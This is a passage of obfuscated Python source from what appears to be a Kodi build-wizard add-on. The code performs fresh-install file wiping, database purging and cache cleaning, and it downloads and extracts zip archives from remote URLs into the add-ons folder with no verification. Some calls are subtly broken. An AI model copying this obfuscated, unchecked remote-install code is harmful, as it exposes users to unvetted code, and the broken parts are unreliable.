				elif O00000000000O00O0 =='b-mvzyqh-b.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4682
				elif O00000000000O00O0 =='mainmenu.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4683
				elif O00000000000O00O0 =='skin.Premium.mod.properties'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4684
				elif O00000000000O00O0 =='x1122.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4686
				elif O00000000000O00O0 =='b-spvrt-b.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4687
				elif O00000000000O00O0 =='favourites.xml'and OOOOOO0O0OOO00O00 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4692
				elif O00000000000O00O0 =='guisettings.xml'and OOOOOO0O0OOO00O00 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4694
				elif O00000000000O00O0 =='profiles.xml'and OOOOOO0O0OOO00O00 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4695
				elif O00000000000O00O0 =='advancedsettings.xml'and OOOOOO0O0OOO00O00 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4696
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4697
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'program.apollo'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4698
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4699
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'plugin.video.elementum'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4702
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'service.subtitles.All_Subs'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4703
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4704
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'weather.yahoo'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4705
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'plugin.video.quasar'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4706
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'program.apollo'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4707
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4708
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4709
				elif O00000000000O00O0 in LOGFILES :wiz .log ("Keep Log File: %s"%O00000000000O00O0 ,xbmc .LOGNOTICE )#line:4710
				elif O00000000000O00O0 .endswith ('.db'):#line:4711
					try :#line:4712
						if O00000000000O00O0 ==O0O00OO0O0OO0000O and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O00000000000O00O0 ,KODIV ),xbmc .LOGNOTICE )#line:4713
						else :os .remove (os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ))#line:4714
					except Exception as OO0000000OO00O00O :#line:4715
						if not O00000000000O00O0 .startswith ('Textures13'):#line:4716
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4717
							wiz .log ("-> %s"%(str (OO0000000OO00O00O )),xbmc .LOGNOTICE )#line:4718
							wiz .purgeDb (os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ))#line:4719
				else :#line:4720
					DP .update (int (wiz .percentage (OOO00OO0OOO00O0O0 ,O0O0OO0OO0O0OOO0O )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000000000O00O0 ),'')#line:4721
					try :os .remove (os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ))#line:4722
					except Exception as OO0000000OO00O00O :#line:4723
						wiz .log ("Error removing %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4724
						wiz .log ("-> / %s"%(str (OO0000000OO00O00O )),xbmc .LOGNOTICE )#line:4725
			if DP .iscanceled ():#line:4726
				DP .close ()#line:4727
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4728
				return False #line:4729
		for OO00OO0OO0OOO000O ,OO00000OO00O00O00 ,OO0OO00000O00O00O in os .walk (O00000OOO000O0O0O ,topdown =True ):#line:4730
			OO00000OO00O00O00 [:]=[O0OOOOOO00000O000 for O0OOOOOO00000O000 in OO00000OO00O00O00 if O0OOOOOO00000O000 not in EXCLUDES ]#line:4731
			for O00000000000O00O0 in OO00000OO00O00O00 :#line:4732
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00000000000O00O0 ),'')#line:4733
			  if O00000000000O00O0 not in ["Database","userdata","temp","addons","addon_data"]:#line:4734
			   if not (O00000000000O00O0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4735
			    if not (O00000000000O00O0 =='skin.titan'and KEEPSKIN3 =='true'):#line:4737
			      if not (O00000000000O00O0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4738
			       if not (O00000000000O00O0 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4739
			        if not (O00000000000O00O0 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4740
			         if not (O00000000000O00O0 =='program.apollo'and KEEPINFO =='true'):#line:4741
			          if not (O00000000000O00O0 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4742
			           if not (O00000000000O00O0 =='weather.yahoo'and KEEPWEATHER =='true'):#line:4743
			            if not (O00000000000O00O0 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4744
			             if not (O00000000000O00O0 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4745
			              if not (O00000000000O00O0 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4746
			               if not (O00000000000O00O0 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4747
			                if not (O00000000000O00O0 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4748
			                 if not (O00000000000O00O0 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4749
			                  if not (O00000000000O00O0 =='plugin.video.neptune'and KEEPINFO =='true'):#line:4750
			                   if not (O00000000000O00O0 =='plugin.video.youtube'and KEEPINFO =='true'):#line:4751
			                    if not (O00000000000O00O0 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4752
			                     if not (O00000000000O00O0 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4753
			                       if not (O00000000000O00O0 =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4755
			                           if not (O00000000000O00O0 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4759
			                            if not (O00000000000O00O0 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4760
			                             if not (O00000000000O00O0 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4761
			                              if not (O00000000000O00O0 =='plugin.video.quasar'and KEEPINFO =='true'):#line:4762
			                               if not (O00000000000O00O0 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4763
			                                  shutil .rmtree (os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),ignore_errors =True ,onerror =None )#line:4765
			if DP .iscanceled ():#line:4766
				DP .close ()#line:4767
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4768
				return False #line:4769
		DP .close ()#line:4770
		wiz .clearS ('build')#line:4771
		if over ==True :#line:4772
			return True #line:4773
		elif install =='restore':#line:4774
			return True #line:4775
		elif install :#line:4776
			buildWizard (install ,'normal',over =True )#line:4777
		else :#line:4778
			if INSTALLMETHOD ==1 :O0O0OO0O0OO000OOO =1 #line:4779
			elif INSTALLMETHOD ==2 :O0O0OO0O0OO000OOO =0 #line:4780
			else :O0O0OO0O0OO000OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:4781
			if O0O0OO0O0OO000OOO ==1 :wiz .reloadFix ('fresh')#line:4782
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:4783
	else :#line:4784
		if not install =='restore':#line:4785
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:4786
			wiz .refresh ()#line:4787
def clearCache ():#line:4792
		wiz .clearCache ()#line:4793
def fixwizard ():#line:4797
		wiz .fixwizard ()#line:4798
def totalClean ():#line:4800
		wiz .clearCache ()#line:4802
		wiz .clearPackages ('total')#line:4803
		clearThumb ('total')#line:4804
		cleanfornewbuild ()#line:4805
def cleanfornewbuild ():#line:4806
		try :#line:4807
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4808
		except :#line:4809
			pass #line:4810
		try :#line:4811
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4812
		except :#line:4813
			pass #line:4814
		try :#line:4815
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:4816
		except :#line:4817
			pass #line:4818
def clearThumb (type =None ):#line:4819
	OO00O00O0OO0OO0O0 =wiz .latestDB ('Textures')#line:4820
	if not type ==None :OOO000000O000OO00 =1 #line:4821
	else :OOO000000O000OO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO00O00O0OO0OO0O0 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4822
	if OOO000000O000OO00 ==1 :#line:4823
		try :wiz .removeFile (os .join (DATABASE ,OO00O00O0OO0OO0O0 ))#line:4824
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO00O00O0OO0OO0O0 )#line:4825
		wiz .removeFolder (THUMBS )#line:4826
	else :wiz .log ('Clear thumbnames cancelled')#line:4828
	wiz .redoThumbs ()#line:4829
def purgeDb ():#line:4831
	O0O0OO00OO000OO00 =[];O0OOO0OOOOO00OOO0 =[]#line:4832
	for O000OOO0OOO0OOO00 ,O0OO000OO0O0O0OO0 ,O0O0OO00O0000OOO0 in os .walk (HOME ):#line:4833
		for O0O0O0O0O00O000OO in fnmatch .filter (O0O0OO00O0000OOO0 ,'*.db'):#line:4834
			if O0O0O0O0O00O000OO !='Thumbs.db':#line:4835
				O0O0OOO0O000OO00O =os .path .join (O000OOO0OOO0OOO00 ,O0O0O0O0O00O000OO )#line:4836
				O0O0OO00OO000OO00 .append (O0O0OOO0O000OO00O )#line:4837
				O00O00OO000OOOOOO =O0O0OOO0O000OO00O .replace ('\\','/').split ('/')#line:4838
				O0OOO0OOOOO00OOO0 .append ('(%s) %s'%(O00O00OO000OOOOOO [len (O00O00OO000OOOOOO )-2 ],O00O00OO000OOOOOO [len (O00O00OO000OOOOOO )-1 ]))#line:4839
	if KODIV >=16 :#line:4840
		O000OO00OOO0O0O0O =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OOO0OOOOO00OOO0 )#line:4841
		if O000OO00OOO0O0O0O ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4842
		elif len (O000OO00OOO0O0O0O )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4843
		else :#line:4844
			for OO0OO00O000O0OOO0 in O000OO00OOO0O0O0O :wiz .purgeDb (O0O0OO00OO000OO00 [OO0OO00O000O0OOO0 ])#line:4845
	else :#line:4846
		O000OO00OOO0O0O0O =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OOO0OOOOO00OOO0 )#line:4847
		if O000OO00OOO0O0O0O ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4848
		else :wiz .purgeDb (O0O0OO00OO000OO00 [OO0OO00O000O0OOO0 ])#line:4849
def fastupdatefirstbuild (OOO0O000O0OOO0O0O ):#line:4855
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:4857
	if ENABLE =='Yes':#line:4858
		if not NOTIFY =='true':#line:4859
			O0O0O000OOO0000OO =wiz .workingURL (NOTIFICATION )#line:4860
			if O0O0O000OOO0000OO ==True :#line:4861
				OOOOO0O0OO000OOOO ,O000OO00OOOOO000O =wiz .splitNotify (NOTIFICATION )#line:4862
				if not OOOOO0O0OO000OOOO ==False :#line:4864
					try :#line:4865
						OOOOO0O0OO000OOOO =int (OOOOO0O0OO000OOOO );OOO0O000O0OOO0O0O =int (OOO0O000O0OOO0O0O )#line:4866
						checkidupdate ()#line:4867
						wiz .setS ("notedismiss","true")#line:4868
						if OOOOO0O0OO000OOOO ==OOO0O000O0OOO0O0O :#line:4869
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OOOOO0O0OO000OOOO ),xbmc .LOGNOTICE )#line:4870
						elif OOOOO0O0OO000OOOO >OOO0O000O0OOO0O0O :#line:4872
							wiz .log ("[Notifications] id: %s"%str (OOOOO0O0OO000OOOO ),xbmc .LOGNOTICE )#line:4873
							wiz .setS ('noteid',str (OOOOO0O0OO000OOOO ))#line:4874
							wiz .setS ("notedismiss","true")#line:4875
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:4878
					except Exception as OO0O0OO0O00OO00OO :#line:4879
						wiz .log ("Error on Notifications Window: %s"%str (OO0O0OO0O00OO00OO ),xbmc .LOGERROR )#line:4880
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4882
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0O0O000OOO0000OO ),xbmc .LOGNOTICE )#line:4883
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:4884
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:4885
def checkidupdate ():#line:4891
				wiz .setS ("notedismiss","true")#line:4893
				OOOOO00000O0OO00O =wiz .workingURL (NOTIFICATION )#line:4894
				O0O00O0OO00OO000O =" Kodi Premium"#line:4896
				OO000OO0OO00O0OOO =wiz .checkBuild (O0O00O0OO00OO000O ,'gui')#line:4897
				O0OOO0O0O00O00O0O =O0O00O0OO00OO000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4898
				if not wiz .workingURL (OO000OO0OO00O0OOO )==True :return #line:4899
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4900
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0O00O0OO00OO000O ),'','אנא המתן')#line:4901
				O0OO0000OO0OOO0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OOO0O0O00O00O0O )#line:4902
				try :os .remove (O0OO0000OO0OOO0OO )#line:4903
				except :pass #line:4904
				logging .warning (OO000OO0OO00O0OOO )#line:4905
				if 'google'in OO000OO0OO00O0OOO :#line:4906
				   O0OOOO0O0000000O0 =googledrive_download (OO000OO0OO00O0OOO ,O0OO0000OO0OOO0OO ,DP ,wiz .checkBuild (O0O00O0OO00OO000O ,'filesize'))#line:4907
				else :#line:4910
				  downloader .download (OO000OO0OO00O0OOO ,O0OO0000OO0OOO0OO ,DP )#line:4911
				xbmc .sleep (100 )#line:4912
				O0OOOO00O0000O000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00O0OO00OO000O )#line:4913
				DP .update (0 ,O0OOOO00O0000O000 ,'','אנא המתן')#line:4914
				extract .all (O0OO0000OO0OOO0OO ,HOME ,DP ,title =O0OOOO00O0000O000 )#line:4915
				DP .close ()#line:4916
				wiz .defaultSkin ()#line:4917
				wiz .lookandFeelData ('save')#line:4918
				if KODIV >=18 :#line:4919
					skindialogsettind18 ()#line:4920
				if INSTALLMETHOD ==1 :OOOO0OO0O0O0O0OOO =1 #line:4923
				elif INSTALLMETHOD ==2 :OOOO0OO0O0O0O0OOO =0 #line:4924
				else :DP .close ()#line:4925
def gaiaserenaddon ():#line:4927
  O00O0O0O0OOOOOOO0 =(ADDON .getSetting ("gaiaseren"))#line:4928
  OOO0000O0000OOO00 =(ADDON .getSetting ("rdbuild"))#line:4929
  if O00O0O0O0OOOOOOO0 =='true'and OOO0000O0000OOO00 =='true':#line:4930
    OOO0O0OO0OOOO0O0O =(NEWFASTUPDATE )#line:4931
    O0O0OO0OO00O00OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4932
    OOOOOOO0OO00O00OO =xbmcgui .DialogProgress ()#line:4933
    OOOOOOO0OO00O00OO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:4934
    OO0OO00OO0O00OO0O =os .path .join (PACKAGES ,'isr.zip')#line:4935
    OO0OOOO000OO0OO0O =urllib2 .Request (OOO0O0OO0OOOO0O0O )#line:4936
    O00O00OOO0000OOO0 =urllib2 .urlopen (OO0OOOO000OO0OO0O )#line:4937
    O00000OOOOOOOO0O0 =xbmcgui .DialogProgress ()#line:4939
    O00000OOOOOOOO0O0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:4940
    O00000OOOOOOOO0O0 .update (0 )#line:4941
    O00000OOOO00OO0O0 =open (OO0OO00OO0O00OO0O ,'wb')#line:4943
    try :#line:4945
      OO00OO0OO0000000O =O00O00OOO0000OOO0 .info ().getheader ('Content-Length').strip ()#line:4946
      O00OO00O00OOOO000 =True #line:4947
    except AttributeError :#line:4948
          O00OO00O00OOOO000 =False #line:4949
    if O00OO00O00OOOO000 :#line:4951
          OO00OO0OO0000000O =int (OO00OO0OO0000000O )#line:4952
    O0O0OO00O0O0OO000 =0 #line:4954
    OO0O00O000O0O0O00 =time .time ()#line:4955
    while True :#line:4956
          OOO000000O00OOO00 =O00O00OOO0000OOO0 .read (8192 )#line:4957
          if not OOO000000O00OOO00 :#line:4958
              sys .stdout .write ('\n')#line:4959
              break #line:4960
          O0O0OO00O0O0OO000 +=len (OOO000000O00OOO00 )#line:4962
          O00000OOOO00OO0O0 .write (OOO000000O00OOO00 )#line:4963
          if not O00OO00O00OOOO000 :#line:4965
              OO00OO0OO0000000O =O0O0OO00O0O0OO000 #line:4966
          if O00000OOOOOOOO0O0 .iscanceled ():#line:4967
             O00000OOOOOOOO0O0 .close ()#line:4968
             try :#line:4969
              os .remove (OO0OO00OO0O00OO0O )#line:4970
             except :#line:4971
              pass #line:4972
             break #line:4973
          OO0OOO0O00OOOO0O0 =float (O0O0OO00O0O0OO000 )/OO00OO0OO0000000O #line:4974
          OO0OOO0O00OOOO0O0 =round (OO0OOO0O00OOOO0O0 *100 ,2 )#line:4975
          O0O000O00O0OO0OOO =O0O0OO00O0O0OO000 /(1024 *1024 )#line:4976
          OO00O0OOO000O00OO =OO00OO0OO0000000O /(1024 *1024 )#line:4977
          OO0000OO0000OOO00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O000O00O0OO0OOO ,'teal',OO00O0OOO000O00OO )#line:4978
          if (time .time ()-OO0O00O000O0O0O00 )>0 :#line:4979
            O00O0000O0O00O00O =O0O0OO00O0O0OO000 /(time .time ()-OO0O00O000O0O0O00 )#line:4980
            O00O0000O0O00O00O =O00O0000O0O00O00O /1024 #line:4981
          else :#line:4982
           O00O0000O0O00O00O =0 #line:4983
          O00000OOO0O0O0OO0 ='KB'#line:4984
          if O00O0000O0O00O00O >=1024 :#line:4985
             O00O0000O0O00O00O =O00O0000O0O00O00O /1024 #line:4986
             O00000OOO0O0O0OO0 ='MB'#line:4987
          if O00O0000O0O00O00O >0 and not OO0OOO0O00OOOO0O0 ==100 :#line:4988
              OO0OO0O0O00OOO000 =(OO00OO0OO0000000O -O0O0OO00O0O0OO000 )/O00O0000O0O00O00O #line:4989
          else :#line:4990
              OO0OO0O0O00OOO000 =0 #line:4991
          OOOO00O00OOOOOO0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00O0000O0O00O00O ,O00000OOO0O0O0OO0 )#line:4992
          O00000OOOOOOOO0O0 .update (int (OO0OOO0O00OOOO0O0 ),OO0000OO0000OOO00 ,OOOO00O00OOOOOO0O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:4994
    OOOOO0OO00O00000O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4997
    O00000OOOO00OO0O0 .close ()#line:5000
    extract .all (OO0OO00OO0O00OO0O ,OOOOO0OO00O00000O ,O00000OOOOOOOO0O0 )#line:5001
    try :#line:5005
      os .remove (OO0OO00OO0O00OO0O )#line:5006
    except :#line:5007
      pass #line:5008
def testnotify ():#line:5010
	OO00O00OO000000OO =wiz .workingURL (NOTIFICATION )#line:5011
	if OO00O00OO000000OO ==True :#line:5012
		try :#line:5013
			OOOO000O00OO0000O ,OOOOOOOOO0OO0O000 =wiz .splitNotify (NOTIFICATION )#line:5014
			if OOOO000O00OO0000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5015
			if STARTP2 ()=='ok':#line:5016
				notify .notification (OOOOOOOOO0OO0O000 ,True )#line:5017
		except Exception as O00OOOO00OOO00O00 :#line:5018
			wiz .log ("Error on Notifications Window: %s"%str (O00OOOO00OOO00O00 ),xbmc .LOGERROR )#line:5019
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5020
def testnotify2 ():#line:5021
	O00O00OOO00OOO0OO =wiz .workingURL (NOTIFICATION2 )#line:5022
	if O00O00OOO00OOO0OO ==True :#line:5023
		try :#line:5024
			OOO0O0OO0OO0OOO0O ,OO0O0O00OO0OOOO0O =wiz .splitNotify (NOTIFICATION2 )#line:5025
